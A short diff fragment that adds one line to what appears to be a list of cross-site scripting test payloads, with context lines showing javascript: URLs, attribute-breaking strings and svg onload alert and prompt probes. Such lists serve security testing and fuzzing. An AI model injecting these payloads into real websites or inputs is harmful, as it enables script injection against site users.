@@ -20,3 +20,4 @@ javascript:alert('XSS is successfully triggered!')
 \'-alert(1)//
 javascript:alert(1)
 "><img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>
+"><svg/onload=alert('1')>
